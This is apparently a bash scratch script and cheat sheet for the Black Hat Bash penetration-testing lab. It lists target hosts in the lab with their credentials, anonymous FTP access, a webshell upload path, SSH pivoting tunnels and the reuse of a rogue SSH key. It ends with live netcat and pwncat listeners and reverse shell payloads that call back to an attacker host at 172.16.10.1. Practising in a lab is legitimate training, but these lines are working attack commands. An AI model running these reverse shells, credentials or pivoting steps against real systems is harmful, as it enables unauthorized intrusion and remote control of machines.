#!/bin/bash

source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"

# How to use:
# bash /home/kali/Projects/Black-Hat-Bash/playground/playground.sh
# bash ./playground/playground.sh
# bash -x ./playground/playground.sh
# bash -r ./playground/playground.sh
# alias playground="bash /home/kali/Projects/Black-Hat-Bash/playground/playground.sh"

# Vulnerabilities:
# 172.16.10.11 (ftp)
#   ftp ftp://anonymous:@172.16.10.11
# 172.16.10.10:8081/upload
#   bash LAB-PLAYGROUND/exercises/run_webshell_opt.sh 172.16.10.10:8081
#   pwncat-cs -l -p 2545
#   nc -lvp 2545
#   run webshell > cd uploads; bash run_rs.sh
# 172.16.10.13
#   ssh backup@172.16.10.13
#   ssh root@172.16.10.13
#   ssh backup@172.16.10.13 -i ~/.ssh/id_rsa (uploaded rogue public key)
#   ssh lp@172.16.10.13 #password=kali
#   pwncat-cs -l -p 4444
# 172.16.10.12/donate.php
#   pwncat-cs -l -p 1337
#   | bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
# 10.1.0.13 (c-backup - corporate network)
#   PORT 8095 - listen from p-web-02 (172.16.10.12/10.1.0.11)
#   PORT 8096 - listen from p-jumpbox-01 (172.16.10.13/10.1.0.12)
#   execute.sh was updated from p-web-01 () to establish reverse shell to p-web-02 (which has both public & corporate network access)
# 10.1.0.16 (MariaDB + WordPress Admin Page)
#   username = root, password = root
#   username = jane, password = bash, login url = http://172.16.10.12/wp-admin
# 10.1.0.14 (redis)
#   ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13
#   ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa
#   metasploit
# 10.1.0.15 (c-db-01)
#   ssh -v -N -L 8888:10.1.0.15:80 backup@172.16.10.13
#   http://localhost:8888/adminer.php: username=adminer_user, password=P@ssword321
#   websell via SQL statement


# Set up listener
nc -lvp 1111
pwncat-cs -l -p 1111

# Run payload
nohup nc 172.16.10.1 1111 -e /bin/bash &
bash -c 'bash -i >& /dev/tcp/172.16.10.1/1111 0>&1'

# Playground
